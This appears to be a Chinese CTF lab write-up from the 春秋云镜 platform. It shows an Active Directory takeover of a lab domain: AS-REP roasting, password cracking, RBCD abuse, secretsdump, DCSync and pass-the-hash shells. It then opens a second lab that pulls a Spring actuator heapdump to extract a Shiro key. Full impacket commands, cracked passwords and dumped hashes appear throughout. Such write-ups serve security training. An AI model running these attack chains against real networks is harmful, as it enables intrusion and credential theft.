wangying@xiaorang.lab || wangyong@xiaorang.lab || wangyu@xiaorang.lab || wangyun@xiaorang.lab || xumin@xiaorang.lab || xuwei@xiaorang.lab || yangbin@xiaorang.lab || yangbo@xiaorang.lab || yangchao@xiaorang.lab || yangfang@xiaorang.lab || yanghong@xiaorang.lab || yanghua@xiaorang.lab || yangjie@xiaorang.lab || yangjing@xiaorang.lab || yangjuan@xiaorang.lab || yangjun@xiaorang.lab || yangli@xiaorang.lab || yanglin@xiaorang.lab || yangling@xiaorang.lab || yangliu@xiaorang.lab || yangmei@xiaorang.lab || yangming@xiaorang.lab || yangping@xiaorang.lab || yangtao@xiaorang.lab || yangwei@xiaorang.lab || yangxue@xiaorang.lab || yangyan@xiaorang.lab || yangyang@xiaorang.lab || yangyong@xiaorang.lab || zhangbin@xiaorang.lab || zhangbo@xiaorang.lab || zhangchao@xiaorang.lab || zhangdan@xiaorang.lab || zhangfan@xiaorang.lab || zhangfei@xiaorang.lab || zhangfeng@xiaorang.lab || zhanghao@xiaorang.lab || zhanghong@xiaorang.lab || zhanghua@xiaorang.lab || zhanghui@xiaorang.lab || zhangjian@xiaorang.lab || zhangjie@xiaorang.lab || zhangjing@xiaorang.lab || zhangjun@xiaorang.lab || zhanglei@xiaorang.lab || zhangli@xiaorang.lab || zhangliang@xiaorang.lab || zhanglin@xiaorang.lab || zhangling@xiaorang.lab || zhanglong@xiaorang.lab || zhangmei@xiaorang.lab || zhangmin@xiaorang.lab || zhangming@xiaorang.lab || zhangnan@xiaorang.lab || zhangning@xiaorang.lab || zhangpeng@xiaorang.lab || zhangping@xiaorang.lab || zhangqian@xiaorang.lab || zhangqiang@xiaorang.lab || zhangqin@xiaorang.lab || zhangrong@xiaorang.lab || zhangrui@xiaorang.lab || zhangshuai@xiaorang.lab || zhangtao@xiaorang.lab || zhangting@xiaorang.lab || zhangwei@xiaorang.lab || zhangwen@xiaorang.lab || zhangxia@xiaorang.lab || zhangxin@xiaorang.lab || zhangxue@xiaorang.lab || zhangyan@xiaorang.lab || zhangying@xiaorang.lab || zhangyong@xiaorang.lab || zhangyu@xiaorang.lab || zhangyun@xiaorang.lab || zhaojing@xiaorang.lab || zhaojun@xiaorang.lab || zhaoli@xiaorang.lab || zhaomin@xiaorang.lab || zhaowei@xiaorang.lab || zhaoyong@xiaorang.lab || zhoujie@xiaorang.lab || zhoujing@xiaorang.lab || zhouli@xiaorang.lab || zhoumin@xiaorang.lab || zhouwei@xiaorang.lab || zhouyong@xiaorang.lab |+----------------------------+ 将邮箱取出来 12┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# grep -E &quot; [^| ].*lab &quot; 1 -o &gt; 2 然后打 AS-REP Rroasting 123456┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.60.8 -usersfile 2....$krb5asrep$ 23 $wangyun@xiaorang.lab@XIAORANG.LAB:5addef2c40ec88e399e44de7ce033d96$ d6aaf3b1c9a159b341c3bae1a662aa8743446421b4cc6dce7eb9ef56c2f1b6be9a02803e6338077443b120df8460bd985b426021b7413698623d7230ecc39b3046b31a19f7e69f375d535b31fdb7fbf1ac06cbf094ad02de073712bc084678d63f1deb6a5347191cd97e69b6e26ab2a1cfa9e2146f4db57678c959ee7db72fc4f210558a410f75e38c48755eb151fac7dfd41c4c9ad6d05e050b815ec59cff9826fdb89f0222c5f8470759a50b5aeb87d50b99b6be487938bb7c1c9a10ae4e9c45b5759742f507863e35113f72cfeac3532f15ed584cac1a321e1f3e38fa3b90769f559cf8b5bebf50148825....$krb5asrep$ 23 $zhangxin@xiaorang.lab@XIAORANG.LAB:e392adc6c3ca1cd1e039b2c719fbd4de$ 7cf0bfb4a6e46c67fde82e5b3a35db844d3aac45f1b0b842a302386db4f5c7e5d8622a45ff4d0df17489382f47f15b3e268a320a202020838d37f6beeb0ff79bed8b1f3c6f52681a4caeee928c6cebb3bf9b536197e6c40787b1045ac7708d1fbc2e07316b875ccd0ef1f308ad323d21c6d30adf30b2d4287e121b140c579944b21a19329727e98162c05398112bdf14be295c71a373e9a3211efc7fbb5be1074aafc53bc56adc1aeb3c76238623ccc753160eac09b99ec0738b3c5a26b4cee39ea6a797503f87bb9eb36a543326b22f4be1e307b08734467296cd027d7bb5de0761dfcf811975fcf5dc8f8a 可以跑出来两条，然后用 john 爆破 1234567┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# john pass -w =/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusAdm12geC ($krb5asrep$ 23$wangyun@xiaorang.lab@XIAORANG.LAB) 可以爆破出来 wangyun 的密码，然后用 blood-hound 进行域内信息搜集 1234567891011121314151617181920212223242526┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -dc DC.xiaorang.lab -c all --dns-tcp -ns 172.22.60.8 --auth-method ntlm --zipINFO: Found AD domain: xiaorang.labINFO: Connecting to LDAP server: DC.xiaorang.labINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 3 computersINFO: Connecting to LDAP server: DC.xiaorang.labINFO: Found 12 usersINFO: Found 52 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: fileserver.xiaorang.labINFO: Querying computer: PC1.xiaorang.labINFO: Querying computer: DC.xiaorang.labWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.INFO: Done in 00M 09SINFO: Compressing output into 20250504234223_bloodhound.zip 可以发现 zhangxin 属于 Acount Operators，因此对域内非域控的所有机器都具有 GenericAll 权限，而 FILESERVER 机器有 DCSync，思路就很明显了 首先远程桌面连接 172.22.60.15 发现桌面上有一个 xshell，利用 工具 将 xshell 的凭证导出 1234567891011121314151617181920212223PS C:\\Users\\wangyun\\Desktop &gt; .\\SharpXDecrypt.exeXshell 全版本凭证一键导出工具!(支持 Xshell 7.0+版本)Author: 0pen1Github: https://github.com/JDArmy[!] WARNING: For learning purposes only, please delete it within 24 hours after downloading![*] Start GetUserPath.... UserPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7[*] Get UserPath Success ![*] Start GetUserSID.... Username: wangyun userSID: S-1-5-21-3535393121-624993632-895678587-1107[*] GetUserSID Success ! XSHPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\SSH.xsh Host: 172.22.60.45 UserName: zhangxin Password: admin4qwY38cc Version: 7.1[*] read done 抓到了 zhangxin 的密码，然后打 RBCD 12345678910111213141516171819202122232425262728PS C:\\Users\\zhangxin\\Desktop &gt; Set-ExecutionPolicy Bypass -Scope Process执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如https:/go.microsoft.com/fwlink/?LinkID = 135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 (默认值为“N”): YPS C:\\Users\\zhangxin\\Desktop &gt; import-module .\\Powermad.ps1PS C:\\Users\\zhangxin\\Desktop &gt; New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString &quot; 123456 &quot; -AsPlainText -Force)[+] Machine account test addedPS C:\\Users\\zhangxin\\Desktop &gt; import-module .\\powerview.ps1PS C:\\Users\\zhangxin\\Desktop &gt; Get-NetComputer test -Properties objectsidobjectsid---------S-1-5-21-3535393121-624993632-895678587-1117PS C:\\Users\\zhangxin\\Desktop &gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot; O: BAD:(A;; CCDCLCSWRPWPDTLOCRSDRCWDWO;;; S-1-5-21-3535393121-624993632-895678587-1117)&quot;PS C:\\Users\\zhangxin\\Desktop &gt; $SDBytes = New-Object byte[] ($ SD.BinaryLength)PS C:\\Users\\zhangxin\\Desktop &gt; $SD.GetBinaryForm($ SDBytes, 0)PS C:\\Users\\zhangxin\\Desktop &gt; Get-DomainComputer Fileserver| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose详细信息: [Get-DomainSearcher] search string: LDAP://DC.xiaorang.lab/DC = xiaorang, DC = lab详细信息: [Get-DomainObject] Get-DomainObject filter string:(&amp;(|(distinguishedname = CN = FILESERVER, CN = Computers, DC = xiaorang, DC = lab)))详细信息: [Set-DomainObject] Setting &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; to &#x27;1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 97 209185 210 96 165 64 37 123 248 98 53 93 4 0 0&#x27; for object &#x27;FILESERVER$&#x27;PS C:\\Users\\zhangxin\\Desktop &gt; 然后修改/etc/hosts 1234567891011┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali.kali kali# The following lines are desirable for IPv6 capable hosts:: 1 localhost ip6-localhost ip6-loopbackff02:: 1 ip6-allnodesff02:: 2 ip6-allrouters172.22.60.15 PC1.xiaorang.lab172.22.60.42 FILESERVER.xiaorang.lab 然后申请票据就行了 123impacket-getST -dc-ip 172.22.60.8 xiaorang.lab/test\\$: 123456 -spn cifs/Fileserver.xiaorang.lab -impersonate administratorexport KRB5CCNAME = administrator.ccacheproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk 但是后面我又发现一种更简单的方法 12345proxychains python3 addcomputer.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name &#x27;TEST2$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;proxychains python3 rbcd.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -action write -delegate-to &#x27;Fileserver $&#x27; -delegate-from &#x27;TEST2$&#x27;proxychains python3 getST.py xiaorang.lab/&#x27;TEST2$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8 后面也是 12export KRB5CCNAME = administrator.ccacheproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk flag 在 C:\\users\\administrator\\flag 下 FLAG02&amp;FLAG04抓一下 FILESERVER 的哈希 1234567891011121314151617181920212223242526272829┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# secretsdump.py -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5[*] Dumping local SAM hashes (uid: rid: lmhash: nthash)Administrator: 500: aad3b435b51404eeaad3b435b51404ee: bd8e2e150f44ea79fff5034cad4539fc:::Guest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount: 503: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount: 504: aad3b435b51404eeaad3b435b51404ee: b40dda6fd91a2212d118d83e94b61b11:::[*] Dumping cached domain logon information (domain/username: hash)XIAORANG.LAB/Administrator: $DCC2$ 10240#Administrator#f9224930044d24598d509aeb1a015766[*] Dumping LSA Secrets[*] $MACHINE.ACCXIAORANG\\Fileserver$: plain_password_hex: 3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300XIAORANG\\Fileserver$: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::[*] DPAPI_SYSTEMdpapi_machinekey: 0x15367c548c55ac098c599b20b71d1c86a2c1f610dpapi_userkey: 0x28a7796c724094930fc4a3c5a099d0b89dccd6d1[*] NL$KM 0000 8B 14 51 59 D7 67 45 80 9F 4A 54 4C 0D E1 D3 29 ..QY.gE..JTL...) 0010 3E B6 CC 22 FF B7 C5 74 7F E4 B0 AD E7 FA 90 0D &gt;..&quot;...t........ 0020 1B 77 20 D5 A6 67 31 E9 9E 38 DD 95 B0 60 32 C4 .w ..g1..8...`2. 0030 BE 8E 72 4D 0D 90 01 7F 01 30 AC D7 F8 4C 2B 4A ..rM.....0...L+JNL$KM: 8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a[*] Cleaning up...[*] Stopping service RemoteRegistry 然后进行 DcSync 攻击导出域控哈希 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# secretsdump.py xiaorang.lab/&#x27;Fileserver$&#x27;:@172.22.60.8 -hashes &#x27;: 951d8a9265dfb652f42e5c8c497d70dc&#x27;Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator: 500: aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b:::Guest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt: 502: aad3b435b51404eeaad3b435b51404ee: 98194d49adfe247020eaade4a3936d95:::chenfang: 1105: aad3b435b51404eeaad3b435b51404ee: 302b5743b0f7b3436591aedf550ded5b:::zhanghao: 1106: aad3b435b51404eeaad3b435b51404ee: 4c37e7a022daf856bfa2b16824696ab5:::wangyun: 1107: aad3b435b51404eeaad3b435b51404ee: 561d64b9a1c943db32810fb5586a4be9:::zhangwei: 1108: aad3b435b51404eeaad3b435b51404ee: 3d2f864635abb31f2546dc07cbcd2528:::wangkai: 1109: aad3b435b51404eeaad3b435b51404ee: d20a47a4529552805d96a24c3020384c:::yangyan: 1110: aad3b435b51404eeaad3b435b51404ee: 4f80f967fd586f4212bc264a7d1f6789:::zhangxin: 1111: aad3b435b51404eeaad3b435b51404ee: 38780e101b28bb9b9036fc3e2e4f35e6:::wangping: 1112: aad3b435b51404eeaad3b435b51404ee: 0adf6fb0f808be95d449e3b6c67b02dc:::DC$: 1000: aad3b435b51404eeaad3b435b51404ee: f0cc8fa9ded68237e1861cfa3f28d483:::PC1$: 1103: aad3b435b51404eeaad3b435b51404ee: 5fbf6f7f779da62fe4db9d8448cebed5:::FILESERVER$: 1114: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::test1$: 1116: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::lv$: 1117: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::evailpc$: 1118: aad3b435b51404eeaad3b435b51404ee: 8846f7eaee8fb117ad06bdd830b7586c:::ll$: 1119: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::TEST2$: 1120: aad3b435b51404eeaad3b435b51404ee: e19ccf75ee54e06b06a5907af13cef42:::[*] Kerberos keys grabbedAdministrator: aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683Administrator: aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9Administrator: des-cbc-md5: f72a9889a18cc408krbtgt: aes256-cts-hmac-sha1-96:01cbdd6e9fcb7381f08f6ff1c3698f5642e1fd7b2a0dee8c85b9ad370a09abddkrbtgt: aes128-cts-hmac-sha1-96: edde21e07fc8dc56b0d5c7f1cec73691krbtgt: des-cbc-md5:8adace38ba738a34chenfang: aes256-cts-hmac-sha1-96:2c06b19f9f574ee1e7db61071aece803de7af58d229b3529e04d9ec38aac5941chenfang: aes128-cts-hmac-sha1-96:4014efeb6533ba5a572fc41826573c46chenfang: des-cbc-md5: f2ba8f496e702664zhanghao: aes256-cts-hmac-sha1-96: ea51257d0834bdeabc87c48fede2ede9b9833d6d87dcc1ed26747a5990dbb301zhanghao: aes128-cts-hmac-sha1-96:5efc32f73f2cff27f49b80346d0ab172zhanghao: des-cbc-md5: ef19c776ef4caef7wangyun: aes256-cts-hmac-sha1-96:5aac300487414042e25eb1fffe5681392a8c0013c27413c6982b19445032db9awangyun: aes128-cts-hmac-sha1-96:8a2c325e83084282896dcdc40d5780fewangyun: des-cbc-md5: c434a716fe7ad3dczhangwei: aes256-cts-hmac-sha1-96:8ccb33735cb1be69c9e115ecde51ce41d33ee297446d4603ec43f6367ed9c77bzhangwei: aes128-cts-hmac-sha1-96:1fdbe52915e9ccb03b813a2f0215b0c1zhangwei: des-cbc-md5:7998f12a86024a07wangkai: aes256-cts-hmac-sha1-96:76eb8643be14b795327e149899984c077a0db78b4af7faaf45759ef87e44e6a8wangkai: aes128-cts-hmac-sha1-96:4ce9f8c194b606feca44d2c84a8b3215wangkai: des-cbc-md5: e9ec9bb95b514902yangyan: aes256-cts-hmac-sha1-96: e5c045bcb69ef53b66405645764f811b55909c2f67e3b9c5c816e584711206bayangyan: aes128-cts-hmac-sha1-96: b5b5780c2b9014223fff940e2d0ddb99yangyan: des-cbc-md5: f2ae7ccb756d2c20zhangxin: aes256-cts-hmac-sha1-96:06f75e8f90bff7ef536d682da9ce719c235d54d4660936aaf71499859960e8b3zhangxin: aes128-cts-hmac-sha1-96: fdb55e032fd0647f4519e225544b3de6zhangxin: des-cbc-md5: df67d6b59d106710wangping: aes256-cts-hmac-sha1-96: d0c1d5bf581d866b7a57c4b75d8dccf2d996d0f91226cd13dae1ebad02c220e0wangping: aes128-cts-hmac-sha1-96: db24cb50818548f0d70ff12b7e94e5bfwangping: des-cbc-md5: e31c10866b6e1af1DC$: aes256-cts-hmac-sha1-96:2177cba61e6bef5c2358728bbd38fcf555a385ca2bc21a7bee0eb7082bc43009DC$: aes128-cts-hmac-sha1-96:2a93500066caecc8ca1fd443dfe71045DC$: des-cbc-md5: d99d163738d0514aPC1$: aes256-cts-hmac-sha1-96:6f9ab6bbf92b25ffc47a2e2e4d02611810153ed1f638ad0661a1c2ba6a44c35bPC1$: aes128-cts-hmac-sha1-96: a332459ac3ed4676081045169db6642fPC1$: des-cbc-md5: c1bf253e7abcfe3eFILESERVER$: aes256-cts-hmac-sha1-96:3c57a20b8c4506d147055c344c6a1b029ad98df9885950b4962a5da1d737bf81FILESERVER$: aes128-cts-hmac-sha1-96: e199679dc0624225beb20d195bcebf89FILESERVER$: des-cbc-md5: cb98a7ce7043a7batest1$: aes256-cts-hmac-sha1-96:12d38e3177a4f263be6da2f3ec99357341205fc563c165866aee4a6d46f55801test1$: aes128-cts-hmac-sha1-96:87646137635d8377a3558ed890818c8etest1$: des-cbc-md5: b561234070166d9blv$: aes256-cts-hmac-sha1-96: b5e3de41bfde0550d7c122c2521ccdf1f071679d01823c8e7a3102bd060ae9eflv$: aes128-cts-hmac-sha1-96: bd32120973f173a6aea2d174072dffb1lv$: des-cbc-md5:38e397adbc027f4cevailpc$: aes256-cts-hmac-sha1-96:9d216633c05f405b584a68b418250a99c47de5afaa8261cbaa85e71c1a450b38evailpc$: aes128-cts-hmac-sha1-96:7d88d455f095e199cc2a9b97ce72b38cevailpc$: des-cbc-md5:8664376ea2cb5280ll$: aes256-cts-hmac-sha1-96:2ee5b4caa01084d7cefb60fce5daa2bb35e2c06bdb4b56516b0d5f1f926819dfll$: aes128-cts-hmac-sha1-96:5db4f55cb677946d95a74a19df68ab44ll$: des-cbc-md5: d37615076e451ca8TEST2$: aes256-cts-hmac-sha1-96:6fad46be8d54b5431df61db10866c987d2c64ff528419ec0ee7f7a38d6e7ee6fTEST2$: aes128-cts-hmac-sha1-96:476a93fc85b66f3861e3b51e39f3b8d0TEST2$: des-cbc-md5:640780a13ee357c7[*] Cleaning up... 拿到域控之后就横向就可以了 1234567wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] SMBv3.0 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\\&gt; 12345678┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.8Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] SMBv3.0 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\\&gt;","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-ThermalPower","slug":"春秋云镜-ThermalPower","date":"2025-05-02T03:09:18.000Z","updated":"2025-05-02T14:00:33.448Z","comments":true,"path":"2025/05/02/春秋云镜-ThermalPower/","permalink":"https://lvzhouhang.xyz/2025/05/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/","excerpt":"","text":"FLAG0112345678910111213141516171819202122232425262728293031323334353637┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# ../../pentest/fscan/fscan2 -h 39.98.122.145┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-05-01 23:10:46] [INFO] 暴力破解线程数: 1[2025-05-01 23:10:46] [INFO] 开始信息扫描[2025-05-01 23:10:46] [INFO] 最终有效主机数量: 1[2025-05-01 23:10:46] [INFO] 开始主机扫描[2025-05-01 23:10:46] [INFO] 有效端口数量: 233[2025-05-01 23:10:46] [SUCCESS] 端口开放 39.98.122.145:22[2025-05-01 23:10:47] [SUCCESS] 服务识别 39.98.122.145:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-05-01 23:10:49] [SUCCESS] 端口开放 39.98.122.145:8080[2025-05-01 23:10:54] [SUCCESS] 服务识别 39.98.122.145:8080 =&gt; [http][2025-05-01 23:10:56] [INFO] 存活端口数量: 2[2025-05-01 23:10:56] [INFO] 开始漏洞扫描[2025-05-01 23:10:56] [INFO] 加载的插件: ssh, webpoc, webtitle[2025-05-01 23:10:56] [SUCCESS] 网站标题 http://39.98.122.145:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6[2025-05-01 23:10:57] [SUCCESS] 网站标题 http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6 状 态码:200 长度:2936 标题:火创能源监控画面管理平台[2025-05-01 23:11:00] [SUCCESS] 目标: http://39.98.122.145:8080 漏洞类型: poc-yaml-spring-actuator-heapdump-file 漏洞名称: 详细信息: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html[2025-05-01 23:11:00] [SUCCESS] 目标: http://39.98.122.145:8080 漏洞类型: poc-yaml-springboot-env-unauth 漏洞名称: spring2 详细信息: links:https://github.com/LandGrey/SpringBootVulExploit[2025-05-01 23:11:03] [SUCCESS] 扫描已完成: 3/3 可以扫有8080端口有一个poc-yaml-spring-actuator-heapdump-file，先将heapdump文件下载下来 1234567891011┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# wget http://39.98.122.145:8080/actuator/heapdump--2025-05-01 23:13:13-- http://39.98.122.145:8080/actuator/heapdumpConnecting to 39.98.122.145:8080... connected.HTTP request sent, awaiting response... 200Length: 31181349 (30M) [application/octet-stream]Saving to: ‘heapdump’heapdump 100%[=================================================&gt;] 29.74M 1.36MB/s in 21s2025-05-01 23:13:35 (1.41 MB/s) - ‘heapdump’ saved [31181349/31181349] 然后用工具进行分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump===========================================SpringDataSourceProperties-------------not found!===========================================WeblogicDataSourceConnectionPoolConfig-------------not found!===========================================MongoClient-------------not found!===========================================AliDruidDataSourceWrapper-------------not found!===========================================HikariDataSource-------------not found!===========================================RedisStandaloneConfiguration-------------not found!===========================================JedisClient-------------not found!===========================================CookieRememberMeManager(ShiroKey)-------------algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES===========================================OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include = *spring.thymeleaf.encoding = UTF-8management.endpoint.health.show-details = alwaysspring.thymeleaf.cache = truespring.thymeleaf.content-type = text/htmlserver.port = 8080spring.thymeleaf.check-template = truemanagement.endpoints.jmx.exposure.include = *===========================================MutablePropertySources-------------awt.toolkit = sun.awt.X11.XToolkitsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilerssun.cpu.isalist =sun.jnu.encoding = UTF-8java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08java.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarpath.separator = :java.vm.vendor = Private Buildos.version = 5.4.0-166-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name = OpenJDK Runtime Environmentfile.encoding = UTF-8catalina.useNaming = falsespring.beaninfo.ignore = truejava.vm.specification.version = 1.8os.name = Linuxjava.vm.name = OpenJDK 64-Bit Server VMlocal.server.port = nulluser.country = USjava.vendor.url.bug = http://bugreport.sun.com/bugreport/sun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarjava.io.tmpdir = /tmpcatalina.home = /tmp/tomcat.8080.2227855515484347988java.version = 1.8.0_392user.home = /rootuser.language = enPID = 620java.awt.printerjob = sun.print.PSPrinterJobCONSOLE_LOG_CHARSET = UTF-8file.separator = /catalina.base = /tmp/tomcat.8080.2227855515484347988java.vm.info = mixed modejava.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle CorporationFILE_LOG_CHARSET = UTF-8java.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentjava.awt.headless = truesun.io.unicode.encoding = UnicodeLittlejava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext===========================================MapPropertySources-------------local.server.port = null===========================================ConsulPropertySources-------------not found!===========================================JavaProperties-------------java.util.logging.FileHandler.pattern = %h/java%u.logawt.toolkit = sun.awt.X11.XToolkitsun.cpu.isalist =sun.jnu.encoding = UTF-8java.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarjdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048java.vm.vendor = Private Buildjdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, 